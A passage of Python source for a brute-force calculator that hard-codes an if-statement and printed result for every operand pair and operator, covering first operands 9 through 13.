and num_2 == 13 and calc == '+': print('9 + 13 = 22')\nif num_1 == 9 and num_2 == 13 and calc == '-': print('9 - 13 = -4')\nif num_1 == 9 and num_2 == 13 and calc == '*': print('9 * 13 = 117')\nif num_1 == 9 and num_2 == 13 and calc == '/': print('9 / 13 = 0.6923076923076923')\nif num_1 == 9 and num_2 == 14 and calc == '+': print('9 + 14 = 23')\nif num_1 == 9 and num_2 == 14 and calc == '-': print('9 - 14 = -5')\nif num_1 == 9 and num_2 == 14 and calc == '*': print('9 * 14 = 126')\nif num_1 == 9 and num_2 == 14 and calc == '/': print('9 / 14 = 0.6428571428571429')\nif num_1 == 9 and num_2 == 15 and calc == '+': print('9 + 15 = 24')\nif num_1 == 9 and num_2 == 15 and calc == '-': print('9 - 15 = -6')\nif num_1 == 9 and num_2 == 15 and calc == '*': print('9 * 15 = 135')\nif num_1 == 9 and num_2 == 15 and calc == '/': print('9 / 15 = 0.6')\nif num_1 == 9 and num_2 == 16 and calc == '+': print('9 + 16 = 25')\nif num_1 == 9 and num_2 == 16 and calc == '-': print('9 - 16 = -7')\nif num_1 == 9 and num_2 == 16 and calc == '*': print('9 * 16 = 144')\nif num_1 == 9 and num_2 == 16 and calc == '/': print('9 / 16 = 0.5625')\nif num_1 == 9 and num_2 == 17 and calc == '+': print('9 + 17 = 26')\nif num_1 == 9 and num_2 == 17 and calc == '-': print('9 - 17 = -8')\nif num_1 == 9 and num_2 == 17 and calc == '*': print('9 * 17 = 153')\nif num_1 == 9 and num_2 == 17 and calc == '/': print('9 / 17 = 0.5294117647058824')\nif num_1 == 9 and num_2 == 18 and calc == '+': print('9 + 18 = 27')\nif num_1 == 9 and num_2 == 18 and calc == '-': print('9 - 18 = -9')\nif num_1 == 9 and num_2 == 18 and calc == '*': print('9 * 18 = 162')\nif num_1 == 9 and num_2 == 18 and calc == '/': print('9 / 18 = 0.5')\nif num_1 == 9 and num_2 == 19 and calc == '+': print('9 + 19 = 28')\nif num_1 == 9 and num_2 == 19 and calc == '-': print('9 - 19 = -10')\nif num_1 == 9 and num_2 == 19 and calc == '*': print('9 * 19 = 171')\nif num_1 == 9 and num_2 == 19 and calc == '/': print('9 / 19 = 0.47368421052631576')\nif num_1 == 9 and num_2 == 20 and calc == '+': print('9 + 20 = 29')\nif num_1 == 9 and num_2 == 20 and calc == '-': print('9 - 20 = -11')\nif num_1 == 9 and num_2 == 20 and calc == '*': print('9 * 20 = 180')\nif num_1 == 9 and num_2 == 20 and calc == '/': print('9 / 20 = 0.45')\nif num_1 == 9 and num_2 == 21 and calc == '+': print('9 + 21 = 30')\nif num_1 == 9 and num_2 == 21 and calc == '-': print('9 - 21 = -12')\nif num_1 == 9 and num_2 == 21 and calc == '*': print('9 * 21 = 189')\nif num_1 == 9 and num_2 == 21 and calc == '/': print('9 / 21 = 0.42857142857142855')\nif num_1 == 9 and num_2 == 22 and calc == '+': print('9 + 22 = 31')\nif num_1 == 9 and num_2 == 22 and calc == '-': print('9 - 22 = -13')\nif num_1 == 9 and num_2 == 22 and calc == '*': print('9 * 22 = 198')\nif num_1 == 9 and num_2 == 22 and calc == '/': print('9 / 22 = 0.4090909090909091')\nif num_1 == 9 and num_2 == 23 and calc == '+': print('9 + 23 = 32')\nif num_1 == 9 and num_2 == 23 and calc == '-': print('9 - 23 = -14')\nif num_1 == 9 and num_2 == 23 and calc == '*': print('9 * 23 = 207')\nif num_1 == 9 and num_2 == 23 and calc == '/': print('9 / 23 = 0.391304347826087')\nif num_1 == 9 and num_2 == 24 and calc == '+': print('9 + 24 = 33')\nif num_1 == 9 and num_2 == 24 and calc == '-': print('9 - 24 = -15')\nif num_1 == 9 and num_2 == 24 and calc == '*': print('9 * 24 = 216')\nif num_1 == 9 and num_2 == 24 and calc == '/': print('9 / 24 = 0.375')\nif num_1 == 10 and num_2 == 0 and calc == '+': print('10 + 0 = 10')\nif num_1 == 10 and num_2 == 0 and calc == '-': print('10 - 0 = 10')\nif num_1 == 10 and num_2 == 0 and calc == '*': print('10 * 0 = 0')\nif num_1 == 10 and num_2 == 0 and calc == '/': print('10 / 0 = Cannot divide by zero!')\nif num_1 == 10 and num_2 == 1 and calc == '+': print('10 + 1 = 11')\nif num_1 == 10 and num_2 == 1 and calc == '-': print('10 - 1 = 9')\nif num_1 == 10 and num_2 == 1 and calc == '*': print('10 * 1 = 10')\nif num_1 == 10 and num_2 == 1 and calc == '/': print('10 / 1 = 10.0')\nif num_1 == 10 and num_2 == 2 and calc == '+': print('10 + 2 = 12')\nif num_1 == 10 and num_2 == 2 and calc == '-': print('10 - 2 = 8')\nif num_1 == 10 and num_2 == 2 and calc == '*': print('10 * 2 = 20')\nif num_1 == 10 and num_2 == 2 and calc == '/': print('10 / 2 = 5.0')\nif num_1 == 10 and num_2 == 3 and calc == '+': print('10 + 3 = 13')\nif num_1 == 10 and num_2 == 3 and calc == '-': print('10 - 3 = 7')\nif num_1 == 10 and num_2 == 3 and calc == '*': print('10 * 3 = 30')\nif num_1 == 10 and num_2 == 3 and calc == '/': print('10 / 3 = 3.3333333333333335')\nif num_1 == 10 and num_2 == 4 and calc == '+': print('10 + 4 = 14')\nif num_1 == 10 and num_2 == 4 and calc == '-': print('10 - 4 = 6')\nif num_1 == 10 and num_2 == 4 and calc == '*': print('10 * 4 = 40')\nif num_1 == 10 and num_2 == 4 and calc == '/': print('10 / 4 = 2.5')\nif num_1 == 10 and num_2 == 5 and calc == '+': print('10 + 5 = 15')\nif num_1 == 10 and num_2 == 5 and calc == '-': print('10 - 5 = 5')\nif num_1 == 10 and num_2 == 5 and calc == '*': print('10 * 5 = 50')\nif num_1 == 10 and num_2 == 5 and calc == '/': print('10 / 5 = 2.0')\nif num_1 == 10 and num_2 == 6 and calc == '+': print('10 + 6 = 16')\nif num_1 == 10 and num_2 == 6 and calc == '-': print('10 - 6 = 4')\nif num_1 == 10 and num_2 == 6 and calc == '*': print('10 * 6 = 60')\nif num_1 == 10 and num_2 == 6 and calc == '/': print('10 / 6 = 1.6666666666666667')\nif num_1 == 10 and num_2 == 7 and calc == '+': print('10 + 7 = 17')\nif num_1 == 10 and num_2 == 7 and calc == '-': print('10 - 7 = 3')\nif num_1 == 10 and num_2 == 7 and calc == '*': print('10 * 7 = 70')\nif num_1 == 10 and num_2 == 7 and calc == '/': print('10 / 7 = 1.4285714285714286')\nif num_1 == 10 and num_2 == 8 and calc == '+': print('10 + 8 = 18')\nif num_1 == 10 and num_2 == 8 and calc == '-': print('10 - 8 = 2')\nif num_1 == 10 and num_2 == 8 and calc == '*': print('10 * 8 = 80')\nif num_1 == 10 and num_2 == 8 and calc == '/': print('10 / 8 = 1.25')\nif num_1 == 10 and num_2 == 9 and calc == '+': print('10 + 9 = 19')\nif num_1 == 10 and num_2 == 9 and calc == '-': print('10 - 9 = 1')\nif num_1 == 10 and num_2 == 9 and calc == '*': print('10 * 9 = 90')\nif num_1 == 10 and num_2 == 9 and calc == '/': print('10 / 9 = 1.1111111111111112')\nif num_1 == 10 and num_2 == 10 and calc == '+': print('10 + 10 = 20')\nif num_1 == 10 and num_2 == 10 and calc == '-': print('10 - 10 = 0')\nif num_1 == 10 and num_2 == 10 and calc == '*': print('10 * 10 = 100')\nif num_1 == 10 and num_2 == 10 and calc == '/': print('10 / 10 = 1.0')\nif num_1 == 10 and num_2 == 11 and calc == '+': print('10 + 11 = 21')\nif num_1 == 10 and num_2 == 11 and calc == '-': print('10 - 11 = -1')\nif num_1 == 10 and num_2 == 11 and calc == '*': print('10 * 11 = 110')\nif num_1 == 10 and num_2 == 11 and calc == '/': print('10 / 11 = 0.9090909090909091')\nif num_1 == 10 and num_2 == 12 and calc == '+': print('10 + 12 = 22')\nif num_1 == 10 and num_2 == 12 and calc == '-': print('10 - 12 = -2')\nif num_1 == 10 and num_2 == 12 and calc == '*': print('10 * 12 = 120')\nif num_1 == 10 and num_2 == 12 and calc == '/': print('10 / 12 = 0.8333333333333334')\nif num_1 == 10 and num_2 == 13 and calc == '+': print('10 + 13 = 23')\nif num_1 == 10 and num_2 == 13 and calc == '-': print('10 - 13 = -3')\nif num_1 == 10 and num_2 == 13 and calc == '*': print('10 * 13 = 130')\nif num_1 == 10 and num_2 == 13 and calc == '/': print('10 / 13 = 0.7692307692307693')\nif num_1 == 10 and num_2 == 14 and calc == '+': print('10 + 14 = 24')\nif num_1 == 10 and num_2 == 14 and calc == '-': print('10 - 14 = -4')\nif num_1 == 10 and num_2 == 14 and calc == '*': print('10 * 14 = 140')\nif num_1 == 10 and num_2 == 14 and calc == '/': print('10 / 14 = 0.7142857142857143')\nif num_1 == 10 and num_2 == 15 and calc == '+': print('10 + 15 = 25')\nif num_1 == 10 and num_2 == 15 and calc == '-': print('10 - 15 = -5')\nif num_1 == 10 and num_2 == 15 and calc == '*': print('10 * 15 = 150')\nif num_1 == 10 and num_2 == 15 and calc == '/': print('10 / 15 = 0.6666666666666666')\nif num_1 == 10 and num_2 == 16 and calc == '+': print('10 + 16 = 26')\nif num_1 == 10 and num_2 == 16 and calc == '-': print('10 - 16 = -6')\nif num_1 == 10 and num_2 == 16 and calc == '*': print('10 * 16 = 160')\nif num_1 == 10 and num_2 == 16 and calc == '/': print('10 / 16 = 0.625')\nif num_1 == 10 and num_2 == 17 and calc == '+': print('10 + 17 = 27')\nif num_1 == 10 and num_2 == 17 and calc == '-': print('10 - 17 = -7')\nif num_1 == 10 and num_2 == 17 and calc == '*': print('10 * 17 = 170')\nif num_1 == 10 and num_2 == 17 and calc == '/': print('10 / 17 = 0.5882352941176471')\nif num_1 == 10 and num_2 == 18 and calc == '+': print('10 + 18 = 28')\nif num_1 == 10 and num_2 == 18 and calc == '-': print('10 - 18 = -8')\nif num_1 == 10 and num_2 == 18 and calc == '*': print('10 * 18 = 180')\nif num_1 == 10 and num_2 == 18 and calc == '/': print('10 / 18 = 0.5555555555555556')\nif num_1 == 10 and num_2 == 19 and calc == '+': print('10 + 19 = 29')\nif num_1 == 10 and num_2 == 19 and calc == '-': print('10 - 19 = -9')\nif num_1 == 10 and num_2 == 19 and calc == '*': print('10 * 19 = 190')\nif num_1 == 10 and num_2 == 19 and calc == '/': print('10 / 19 = 0.5263157894736842')\nif num_1 == 10 and num_2 == 20 and calc == '+': print('10 + 20 = 30')\nif num_1 == 10 and num_2 == 20 and calc == '-': print('10 - 20 = -10')\nif num_1 == 10 and num_2 == 20 and calc == '*': print('10 * 20 = 200')\nif num_1 == 10 and num_2 == 20 and calc == '/': print('10 / 20 = 0.5')\nif num_1 == 10 and num_2 == 21 and calc == '+': print('10 + 21 = 31')\nif num_1 == 10 and num_2 == 21 and calc == '-': print('10 - 21 = -11')\nif num_1 == 10 and num_2 == 21 and calc == '*': print('10 * 21 = 210')\nif num_1 == 10 and num_2 == 21 and calc == '/': print('10 / 21 = 0.47619047619047616')\nif num_1 == 10 and num_2 == 22 and calc == '+': print('10 + 22 = 32')\nif num_1 == 10 and num_2 == 22 and calc == '-': print('10 - 22 = -12')\nif num_1 == 10 and num_2 == 22 and calc == '*': print('10 * 22 = 220')\nif num_1 == 10 and num_2 == 22 and calc == '/': print('10 / 22 = 0.45454545454545453')\nif num_1 == 10 and num_2 == 23 and calc == '+': print('10 + 23 = 33')\nif num_1 == 10 and num_2 == 23 and calc == '-': print('10 - 23 = -13')\nif num_1 == 10 and num_2 == 23 and calc == '*': print('10 * 23 = 230')\nif num_1 == 10 and num_2 == 23 and calc == '/': print('10 / 23 = 0.43478260869565216')\nif num_1 == 10 and num_2 == 24 and calc == '+': print('10 + 24 = 34')\nif num_1 == 10 and num_2 == 24 and calc == '-': print('10 - 24 = -14')\nif num_1 == 10 and num_2 == 24 and calc == '*': print('10 * 24 = 240')\nif num_1 == 10 and num_2 == 24 and calc == '/': print('10 / 24 = 0.4166666666666667')\nif num_1 == 11 and num_2 == 0 and calc == '+': print('11 + 0 = 11')\nif num_1 == 11 and num_2 == 0 and calc == '-': print('11 - 0 = 11')\nif num_1 == 11 and num_2 == 0 and calc == '*': print('11 * 0 = 0')\nif num_1 == 11 and num_2 == 0 and calc == '/': print('11 / 0 = Cannot divide by zero!')\nif num_1 == 11 and num_2 == 1 and calc == '+': print('11 + 1 = 12')\nif num_1 == 11 and num_2 == 1 and calc == '-': print('11 - 1 = 10')\nif num_1 == 11 and num_2 == 1 and calc == '*': print('11 * 1 = 11')\nif num_1 == 11 and num_2 == 1 and calc == '/': print('11 / 1 = 11.0')\nif num_1 == 11 and num_2 == 2 and calc == '+': print('11 + 2 = 13')\nif num_1 == 11 and num_2 == 2 and calc == '-': print('11 - 2 = 9')\nif num_1 == 11 and num_2 == 2 and calc == '*': print('11 * 2 = 22')\nif num_1 == 11 and num_2 == 2 and calc == '/': print('11 / 2 = 5.5')\nif num_1 == 11 and num_2 == 3 and calc == '+': print('11 + 3 = 14')\nif num_1 == 11 and num_2 == 3 and calc == '-': print('11 - 3 = 8')\nif num_1 == 11 and num_2 == 3 and calc == '*': print('11 * 3 = 33')\nif num_1 == 11 and num_2 == 3 and calc == '/': print('11 / 3 = 3.6666666666666665')\nif num_1 == 11 and num_2 == 4 and calc == '+': print('11 + 4 = 15')\nif num_1 == 11 and num_2 == 4 and calc == '-': print('11 - 4 = 7')\nif num_1 == 11 and num_2 == 4 and calc == '*': print('11 * 4 = 44')\nif num_1 == 11 and num_2 == 4 and calc == '/': print('11 / 4 = 2.75')\nif num_1 == 11 and num_2 == 5 and calc == '+': print('11 + 5 = 16')\nif num_1 == 11 and num_2 == 5 and calc == '-': print('11 - 5 = 6')\nif num_1 == 11 and num_2 == 5 and calc == '*': print('11 * 5 = 55')\nif num_1 == 11 and num_2 == 5 and calc == '/': print('11 / 5 = 2.2')\nif num_1 == 11 and num_2 == 6 and calc == '+': print('11 + 6 = 17')\nif num_1 == 11 and num_2 == 6 and calc == '-': print('11 - 6 = 5')\nif num_1 == 11 and num_2 == 6 and calc == '*': print('11 * 6 = 66')\nif num_1 == 11 and num_2 == 6 and calc == '/': print('11 / 6 = 1.8333333333333333')\nif num_1 == 11 and num_2 == 7 and calc == '+': print('11 + 7 = 18')\nif num_1 == 11 and num_2 == 7 and calc == '-': print('11 - 7 = 4')\nif num_1 == 11 and num_2 == 7 and calc == '*': print('11 * 7 = 77')\nif num_1 == 11 and num_2 == 7 and calc == '/': print('11 / 7 = 1.5714285714285714')\nif num_1 == 11 and num_2 == 8 and calc == '+': print('11 + 8 = 19')\nif num_1 == 11 and num_2 == 8 and calc == '-': print('11 - 8 = 3')\nif num_1 == 11 and num_2 == 8 and calc == '*': print('11 * 8 = 88')\nif num_1 == 11 and num_2 == 8 and calc == '/': print('11 / 8 = 1.375')\nif num_1 == 11 and num_2 == 9 and calc == '+': print('11 + 9 = 20')\nif num_1 == 11 and num_2 == 9 and calc == '-': print('11 - 9 = 2')\nif num_1 == 11 and num_2 == 9 and calc == '*': print('11 * 9 = 99')\nif num_1 == 11 and num_2 == 9 and calc == '/': print('11 / 9 = 1.2222222222222223')\nif num_1 == 11 and num_2 == 10 and calc == '+': print('11 + 10 = 21')\nif num_1 == 11 and num_2 == 10 and calc == '-': print('11 - 10 = 1')\nif num_1 == 11 and num_2 == 10 and calc == '*': print('11 * 10 = 110')\nif num_1 == 11 and num_2 == 10 and calc == '/': print('11 / 10 = 1.1')\nif num_1 == 11 and num_2 == 11 and calc == '+': print('11 + 11 = 22')\nif num_1 == 11 and num_2 == 11 and calc == '-': print('11 - 11 = 0')\nif num_1 == 11 and num_2 == 11 and calc == '*': print('11 * 11 = 121')\nif num_1 == 11 and num_2 == 11 and calc == '/': print('11 / 11 = 1.0')\nif num_1 == 11 and num_2 == 12 and calc == '+': print('11 + 12 = 23')\nif num_1 == 11 and num_2 == 12 and calc == '-': print('11 - 12 = -1')\nif num_1 == 11 and num_2 == 12 and calc == '*': print('11 * 12 = 132')\nif num_1 == 11 and num_2 == 12 and calc == '/': print('11 / 12 = 0.9166666666666666')\nif num_1 == 11 and num_2 == 13 and calc == '+': print('11 + 13 = 24')\nif num_1 == 11 and num_2 == 13 and calc == '-': print('11 - 13 = -2')\nif num_1 == 11 and num_2 == 13 and calc == '*': print('11 * 13 = 143')\nif num_1 == 11 and num_2 == 13 and calc == '/': print('11 / 13 = 0.8461538461538461')\nif num_1 == 11 and num_2 == 14 and calc == '+': print('11 + 14 = 25')\nif num_1 == 11 and num_2 == 14 and calc == '-': print('11 - 14 = -3')\nif num_1 == 11 and num_2 == 14 and calc == '*': print('11 * 14 = 154')\nif num_1 == 11 and num_2 == 14 and calc == '/': print('11 / 14 = 0.7857142857142857')\nif num_1 == 11 and num_2 == 15 and calc == '+': print('11 + 15 = 26')\nif num_1 == 11 and num_2 == 15 and calc == '-': print('11 - 15 = -4')\nif num_1 == 11 and num_2 == 15 and calc == '*': print('11 * 15 = 165')\nif num_1 == 11 and num_2 == 15 and calc == '/': print('11 / 15 = 0.7333333333333333')\nif num_1 == 11 and num_2 == 16 and calc == '+': print('11 + 16 = 27')\nif num_1 == 11 and num_2 == 16 and calc == '-': print('11 - 16 = -5')\nif num_1 == 11 and num_2 == 16 and calc == '*': print('11 * 16 = 176')\nif num_1 == 11 and num_2 == 16 and calc == '/': print('11 / 16 = 0.6875')\nif num_1 == 11 and num_2 == 17 and calc == '+': print('11 + 17 = 28')\nif num_1 == 11 and num_2 == 17 and calc == '-': print('11 - 17 = -6')\nif num_1 == 11 and num_2 == 17 and calc == '*': print('11 * 17 = 187')\nif num_1 == 11 and num_2 == 17 and calc == '/': print('11 / 17 = 0.6470588235294118')\nif num_1 == 11 and num_2 == 18 and calc == '+': print('11 + 18 = 29')\nif num_1 == 11 and num_2 == 18 and calc == '-': print('11 - 18 = -7')\nif num_1 == 11 and num_2 == 18 and calc == '*': print('11 * 18 = 198')\nif num_1 == 11 and num_2 == 18 and calc == '/': print('11 / 18 = 0.6111111111111112')\nif num_1 == 11 and num_2 == 19 and calc == '+': print('11 + 19 = 30')\nif num_1 == 11 and num_2 == 19 and calc == '-': print('11 - 19 = -8')\nif num_1 == 11 and num_2 == 19 and calc == '*': print('11 * 19 = 209')\nif num_1 == 11 and num_2 == 19 and calc == '/': print('11 / 19 = 0.5789473684210527')\nif num_1 == 11 and num_2 == 20 and calc == '+': print('11 + 20 = 31')\nif num_1 == 11 and num_2 == 20 and calc == '-': print('11 - 20 = -9')\nif num_1 == 11 and num_2 == 20 and calc == '*': print('11 * 20 = 220')\nif num_1 == 11 and num_2 == 20 and calc == '/': print('11 / 20 = 0.55')\nif num_1 == 11 and num_2 == 21 and calc == '+': print('11 + 21 = 32')\nif num_1 == 11 and num_2 == 21 and calc == '-': print('11 - 21 = -10')\nif num_1 == 11 and num_2 == 21 and calc == '*': print('11 * 21 = 231')\nif num_1 == 11 and num_2 == 21 and calc == '/': print('11 / 21 = 0.5238095238095238')\nif num_1 == 11 and num_2 == 22 and calc == '+': print('11 + 22 = 33')\nif num_1 == 11 and num_2 == 22 and calc == '-': print('11 - 22 = -11')\nif num_1 == 11 and num_2 == 22 and calc == '*': print('11 * 22 = 242')\nif num_1 == 11 and num_2 == 22 and calc == '/': print('11 / 22 = 0.5')\nif num_1 == 11 and num_2 == 23 and calc == '+': print('11 + 23 = 34')\nif num_1 == 11 and num_2 == 23 and calc == '-': print('11 - 23 = -12')\nif num_1 == 11 and num_2 == 23 and calc == '*': print('11 * 23 = 253')\nif num_1 == 11 and num_2 == 23 and calc == '/': print('11 / 23 = 0.4782608695652174')\nif num_1 == 11 and num_2 == 24 and calc == '+': print('11 + 24 = 35')\nif num_1 == 11 and num_2 == 24 and calc == '-': print('11 - 24 = -13')\nif num_1 == 11 and num_2 == 24 and calc == '*': print('11 * 24 = 264')\nif num_1 == 11 and num_2 == 24 and calc == '/': print('11 / 24 = 0.4583333333333333')\nif num_1 == 12 and num_2 == 0 and calc == '+': print('12 + 0 = 12')\nif num_1 == 12 and num_2 == 0 and calc == '-': print('12 - 0 = 12')\nif num_1 == 12 and num_2 == 0 and calc == '*': print('12 * 0 = 0')\nif num_1 == 12 and num_2 == 0 and calc == '/': print('12 / 0 = Cannot divide by zero!')\nif num_1 == 12 and num_2 == 1 and calc == '+': print('12 + 1 = 13')\nif num_1 == 12 and num_2 == 1 and calc == '-': print('12 - 1 = 11')\nif num_1 == 12 and num_2 == 1 and calc == '*': print('12 * 1 = 12')\nif num_1 == 12 and num_2 == 1 and calc == '/': print('12 / 1 = 12.0')\nif num_1 == 12 and num_2 == 2 and calc == '+': print('12 + 2 = 14')\nif num_1 == 12 and num_2 == 2 and calc == '-': print('12 - 2 = 10')\nif num_1 == 12 and num_2 == 2 and calc == '*': print('12 * 2 = 24')\nif num_1 == 12 and num_2 == 2 and calc == '/': print('12 / 2 = 6.0')\nif num_1 == 12 and num_2 == 3 and calc == '+': print('12 + 3 = 15')\nif num_1 == 12 and num_2 == 3 and calc == '-': print('12 - 3 = 9')\nif num_1 == 12 and num_2 == 3 and calc == '*': print('12 * 3 = 36')\nif num_1 == 12 and num_2 == 3 and calc == '/': print('12 / 3 = 4.0')\nif num_1 == 12 and num_2 == 4 and calc == '+': print('12 + 4 = 16')\nif num_1 == 12 and num_2 == 4 and calc == '-': print('12 - 4 = 8')\nif num_1 == 12 and num_2 == 4 and calc == '*': print('12 * 4 = 48')\nif num_1 == 12 and num_2 == 4 and calc == '/': print('12 / 4 = 3.0')\nif num_1 == 12 and num_2 == 5 and calc == '+': print('12 + 5 = 17')\nif num_1 == 12 and num_2 == 5 and calc == '-': print('12 - 5 = 7')\nif num_1 == 12 and num_2 == 5 and calc == '*': print('12 * 5 = 60')\nif num_1 == 12 and num_2 == 5 and calc == '/': print('12 / 5 = 2.4')\nif num_1 == 12 and num_2 == 6 and calc == '+': print('12 + 6 = 18')\nif num_1 == 12 and num_2 == 6 and calc == '-': print('12 - 6 = 6')\nif num_1 == 12 and num_2 == 6 and calc == '*': print('12 * 6 = 72')\nif num_1 == 12 and num_2 == 6 and calc == '/': print('12 / 6 = 2.0')\nif num_1 == 12 and num_2 == 7 and calc == '+': print('12 + 7 = 19')\nif num_1 == 12 and num_2 == 7 and calc == '-': print('12 - 7 = 5')\nif num_1 == 12 and num_2 == 7 and calc == '*': print('12 * 7 = 84')\nif num_1 == 12 and num_2 == 7 and calc == '/': print('12 / 7 = 1.7142857142857142')\nif num_1 == 12 and num_2 == 8 and calc == '+': print('12 + 8 = 20')\nif num_1 == 12 and num_2 == 8 and calc == '-': print('12 - 8 = 4')\nif num_1 == 12 and num_2 == 8 and calc == '*': print('12 * 8 = 96')\nif num_1 == 12 and num_2 == 8 and calc == '/': print('12 / 8 = 1.5')\nif num_1 == 12 and num_2 == 9 and calc == '+': print('12 + 9 = 21')\nif num_1 == 12 and num_2 == 9 and calc == '-': print('12 - 9 = 3')\nif num_1 == 12 and num_2 == 9 and calc == '*': print('12 * 9 = 108')\nif num_1 == 12 and num_2 == 9 and calc == '/': print('12 / 9 = 1.3333333333333333')\nif num_1 == 12 and num_2 == 10 and calc == '+': print('12 + 10 = 22')\nif num_1 == 12 and num_2 == 10 and calc == '-': print('12 - 10 = 2')\nif num_1 == 12 and num_2 == 10 and calc == '*': print('12 * 10 = 120')\nif num_1 == 12 and num_2 == 10 and calc == '/': print('12 / 10 = 1.2')\nif num_1 == 12 and num_2 == 11 and calc == '+': print('12 + 11 = 23')\nif num_1 == 12 and num_2 == 11 and calc == '-': print('12 - 11 = 1')\nif num_1 == 12 and num_2 == 11 and calc == '*': print('12 * 11 = 132')\nif num_1 == 12 and num_2 == 11 and calc == '/': print('12 / 11 = 1.0909090909090908')\nif num_1 == 12 and num_2 == 12 and calc == '+': print('12 + 12 = 24')\nif num_1 == 12 and num_2 == 12 and calc == '-': print('12 - 12 = 0')\nif num_1 == 12 and num_2 == 12 and calc == '*': print('12 * 12 = 144')\nif num_1 == 12 and num_2 == 12 and calc == '/': print('12 / 12 = 1.0')\nif num_1 == 12 and num_2 == 13 and calc == '+': print('12 + 13 = 25')\nif num_1 == 12 and num_2 == 13 and calc == '-': print('12 - 13 = -1')\nif num_1 == 12 and num_2 == 13 and calc == '*': print('12 * 13 = 156')\nif num_1 == 12 and num_2 == 13 and calc == '/': print('12 / 13 = 0.9230769230769231')\nif num_1 == 12 and num_2 == 14 and calc == '+': print('12 + 14 = 26')\nif num_1 == 12 and num_2 == 14 and calc == '-': print('12 - 14 = -2')\nif num_1 == 12 and num_2 == 14 and calc == '*': print('12 * 14 = 168')\nif num_1 == 12 and num_2 == 14 and calc == '/': print('12 / 14 = 0.8571428571428571')\nif num_1 == 12 and num_2 == 15 and calc == '+': print('12 + 15 = 27')\nif num_1 == 12 and num_2 == 15 and calc == '-': print('12 - 15 = -3')\nif num_1 == 12 and num_2 == 15 and calc == '*': print('12 * 15 = 180')\nif num_1 == 12 and num_2 == 15 and calc == '/': print('12 / 15 = 0.8')\nif num_1 == 12 and num_2 == 16 and calc == '+': print('12 + 16 = 28')\nif num_1 == 12 and num_2 == 16 and calc == '-': print('12 - 16 = -4')\nif num_1 == 12 and num_2 == 16 and calc == '*': print('12 * 16 = 192')\nif num_1 == 12 and num_2 == 16 and calc == '/': print('12 / 16 = 0.75')\nif num_1 == 12 and num_2 == 17 and calc == '+': print('12 + 17 = 29')\nif num_1 == 12 and num_2 == 17 and calc == '-': print('12 - 17 = -5')\nif num_1 == 12 and num_2 == 17 and calc == '*': print('12 * 17 = 204')\nif num_1 == 12 and num_2 == 17 and calc == '/': print('12 / 17 = 0.7058823529411765')\nif num_1 == 12 and num_2 == 18 and calc == '+': print('12 + 18 = 30')\nif num_1 == 12 and num_2 == 18 and calc == '-': print('12 - 18 = -6')\nif num_1 == 12 and num_2 == 18 and calc == '*': print('12 * 18 = 216')\nif num_1 == 12 and num_2 == 18 and calc == '/': print('12 / 18 = 0.6666666666666666')\nif num_1 == 12 and num_2 == 19 and calc == '+': print('12 + 19 = 31')\nif num_1 == 12 and num_2 == 19 and calc == '-': print('12 - 19 = -7')\nif num_1 == 12 and num_2 == 19 and calc == '*': print('12 * 19 = 228')\nif num_1 == 12 and num_2 == 19 and calc == '/': print('12 / 19 = 0.631578947368421')\nif num_1 == 12 and num_2 == 20 and calc == '+': print('12 + 20 = 32')\nif num_1 == 12 and num_2 == 20 and calc == '-': print('12 - 20 = -8')\nif num_1 == 12 and num_2 == 20 and calc == '*': print('12 * 20 = 240')\nif num_1 == 12 and num_2 == 20 and calc == '/': print('12 / 20 = 0.6')\nif num_1 == 12 and num_2 == 21 and calc == '+': print('12 + 21 = 33')\nif num_1 == 12 and num_2 == 21 and calc == '-': print('12 - 21 = -9')\nif num_1 == 12 and num_2 == 21 and calc == '*': print('12 * 21 = 252')\nif num_1 == 12 and num_2 == 21 and calc == '/': print('12 / 21 = 0.5714285714285714')\nif num_1 == 12 and num_2 == 22 and calc == '+': print('12 + 22 = 34')\nif num_1 == 12 and num_2 == 22 and calc == '-': print('12 - 22 = -10')\nif num_1 == 12 and num_2 == 22 and calc == '*': print('12 * 22 = 264')\nif num_1 == 12 and num_2 == 22 and calc == '/': print('12 / 22 = 0.5454545454545454')\nif num_1 == 12 and num_2 == 23 and calc == '+': print('12 + 23 = 35')\nif num_1 == 12 and num_2 == 23 and calc == '-': print('12 - 23 = -11')\nif num_1 == 12 and num_2 == 23 and calc == '*': print('12 * 23 = 276')\nif num_1 == 12 and num_2 == 23 and calc == '/': print('12 / 23 = 0.5217391304347826')\nif num_1 == 12 and num_2 == 24 and calc == '+': print('12 + 24 = 36')\nif num_1 == 12 and num_2 == 24 and calc == '-': print('12 - 24 = -12')\nif num_1 == 12 and num_2 == 24 and calc == '*': print('12 * 24 = 288')\nif num_1 == 12 and num_2 == 24 and calc == '/': print('12 / 24 = 0.5')\nif num_1 == 13 and num_2 == 0 and calc == '+': print('13 + 0 = 13')\nif num_1 == 13 and num_2 == 0 and calc == '-': print('13 - 0 = 13')\nif num_1 == 13 and num_2 == 0 and calc == '*': print('13 * 0 = 0')\nif num_1 == 13 and num_2 == 0 and calc == '/': print('13 / 0 = Cannot divide by zero!')\nif num_1 == 13 and num_2 == 1 and calc == '+': print('13 + 1 = 14')\nif num_1 == 13 and num_2 == 1 and calc == '-': print('13 - 1 = 12')\nif num_1 == 13 and num_2 == 1 and calc == '*': print('13 * 1 = 13')\nif num_1 == 13 and num_2 == 1 and calc == '/': print('13 / 1 = 13.0')\nif num_1 == 13 and num_2 == 2 and calc == '+': print('13 + 2 = 15')\nif num_1 == 13 and num_2 == 2 and calc == '-': print('13 - 2 = 11')\nif num_1 == 13 and num_2 == 2 and calc == '*': print('13 * 2 = 26')\nif num_1 == 13 and num_2 == 2 and calc == '/': print('13 / 2 = 6.5')\nif num_1 == 13 and num_2 == 3 and calc == '+': print('13 + 3 = 16')\nif num_1 == 13 and num_2 == 3 and calc == '-': print('13 - 3 = 10')\nif num_1 == 13 and num_2 == 3 and calc == '*': print('13 * 3 = 39')\nif num_1 == 13 and num_2 == 3 and calc == '/': print('13 / 3 = 4.333333333333333')\nif num_1 == 13 and num_2 == 4 and calc == '+': print('13 + 4 = 17')\nif num_1 == 13 and num_2 == 4 and calc == '-': print('13 - 4 = 9')\nif num_1 == 13 and num_2 == 4 and calc == '*': print('13 * 4 = 52')\nif num_1 == 13 and num_2 == 4 and calc == '/': print('13 / 4 = 3.25')\nif num_1 == 13 and num_2 == 5 and calc == '+': print('13 + 5 = 18')\nif num_1 == 13 and num_2 == 5 and calc == '-': print('13 - 5 = 8')\nif num_1 == 13 and num_2 == 5 and calc == '*': print('13 * 5 = 65')\nif num_1 == 13 and num_2 == 5 and calc == '/': print('13 / 5 = 2.6')\nif num_1 == 13 and num_2 == 6 and calc == '+': print('13 + 6 = 19')\nif num_1 == 